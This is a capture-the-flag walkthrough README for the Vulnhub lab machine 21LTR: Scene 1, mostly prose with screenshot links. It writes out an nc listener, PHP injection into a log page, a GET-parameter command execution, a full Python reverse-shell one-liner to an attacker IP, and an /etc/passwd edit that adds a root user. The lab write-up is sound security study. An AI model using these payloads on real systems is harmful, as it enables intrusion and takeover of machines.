# 21LTR: Scene 1 - Vulnhub Machine
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **21LTR: Scene 1** CTF challenge on [Vulnhub](https://www.vulnhub.com/entry/21ltr-scene-1,3/). 
---


we see open ports 21, 22, 80 and 10001

![nm](imgs/nm.png "nm")

![nm2](imgs/nm2.png "nm2")

simple website on port 80

![www](imgs/www.png "www")

we can find credentials in webpage source code

![sr](imgs/sr.png "sr")

brute forcing directories, we found /logs/ but 403 Frobidden

![fer](imgs/fer.png "fer")

we can login to FTP with credentials we found

![ftp](imgs/ftp.png "ftp")

`backup_log.php` content

![log](imgs/log.png "log")

we see that machine is trying to contact address 192.168.2.240

we can try to intercept the communication with wireshark, but first we change our attacker machine IP to 192.168.2.240

![wire1](imgs/wire1.png "wire1")

victim is trying to communicate on port 10000 , we can start a listener on port 10000 to capture the data using `nc -lvnp 10000 > output`

![wire1](imgs/wire1.png "wire1")

![wire2](imgs/wire2.png "wire2")

![nc](imgs/nc.png "nc")

we got .gzip file, we can unpack the backup file but there is nothing interesting 

now we need to test port 10001, using command `while true; do nc -v
192.168.2.120 10001 && break; sleep 1; clear; done`
 
it works, we got a connection, we can type some text that will be reflected in `/logs/backup_log.php`, HTML tags are not cleared

![r](imgs/r.png "r")

we can also test for php execution

![rr](imgs/rr.png "rr")

php is executiong so we can use it to test some simple command execution via GET parameter

testing which python is running using `?cmd=which python`

using this reverse shell payload `?cmd=python -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.2.240",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`

![rs](imgs/rs.png "rs")

we got a shell

using linpeas to find escalation vector

![lin](imgs/lin.png "lin")

linpeas found ssh private key for user hbeale

![ssh](imgs/ssh.png "ssh")

![sshh](imgs/sshh.png "sshh")

we can login via SSH

![login](imgs/login.png "login")

testing `sudo -l` command and taking a look inside `/etc/shadow`

![sudol](imgs/sudol.png "sudol")

we can run sudo without password on `/usr/bin/cat`, we can modify `/etc/passwd` to create new root user 

![hax](imgs/hax.png "hax")

new `/etc/passwd` file

![pass](imgs/pass.png "pass")

teraz możemy zmienić użytkownika na nowo stworzonego haxor'a

now we can login as haxor and we got root

![rt](imgs/rt.png "rt")


# PWNED
